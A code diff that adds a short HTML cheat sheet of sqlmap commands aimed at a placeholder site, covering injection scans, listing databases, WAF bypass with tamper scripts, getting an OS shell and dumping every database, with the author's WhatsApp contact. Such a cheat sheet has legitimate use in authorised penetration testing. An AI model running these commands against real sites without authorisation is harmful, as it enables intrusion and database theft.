@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap Guide From Doc Ahmed.R</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-900 text-white p-6">
+    <div class="max-w-4xl mx-auto">
+        <header class="text-center py-6">
+            <h1 class="text-5xl font-bold text-green-400">SQLMap Guide</h1>
+            <p class="text-gray-400 mt-2">Made By Ahmed.R | <a href="https://wa.me/201098662418" class="text-blue-400">WhatsApp</a></p>
+        </header>
+        
+        <nav class="bg-gray-800 p-4 rounded-lg shadow-lg text-center">
+            <a href="#basic" class="text-green-300 mx-3">Basic Commands</a>
+            <a href="#advanced" class="text-green-300 mx-3">Advanced Commands</a>
+            <a href="#contact" class="text-green-300 mx-3">Contact</a>
+        </nav>
+        
+        <section id="basic" class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg">
+            <h2 class="text-3xl font-semibold text-green-300">Basic Commands</h2>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-x-auto">
+python sqlmap.py -u "http://example.com/index.php?id=1"  # Scan for SQL Injection
+python sqlmap.py -u "http://example.com/index.php?id=1" --dbs  # Fetch database names
+python sqlmap.py -u "http://example.com/index.php?id=1" --dbms=mysql  # Specify database type
+            </pre>
+        </section>
+        
+        <section id="advanced" class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg">
+            <h2 class="text-3xl font-semibold text-green-300">Advanced Commands</h2>
+            <pre class="bg-gray-700 p-3 rounded text-sm overflow-x-auto">
+python sqlmap.py -u "http://example.com/index.php?id=1" --tamper=space2comment  # Bypass WAF
+python sqlmap.py -u "http://example.com/index.php?id=1" --os-shell  # Get OS shell
+python sqlmap.py -u "http://example.com/index.php?id=1" --cookie="sessionid=xyz123"  # Use cookies
+python sqlmap.py -u "http://example.com/index.php?id=1" --dump-all  # Extract full database
+            </pre>
+        </section>
+        
+        <section id="contact" class="mt-6 p-6 bg-gray-800 rounded-lg shadow-lg text-center">
+            <h2 class="text-3xl font-semibold text-green-300">Contact</h2>
+            <p class="text-gray-400">For more info, contact me on WhatsApp:</p>
+            <a href="https://wa.me/201098662418" class="text-blue-400 text-lg">+201098662418</a>
+        </section>
+        
+        <footer class="text-center text-gray-500 mt-6">&copy; 2025 Ahmed.R | All rights reserved.</footer>
+    </div>
+</body>
+</html>
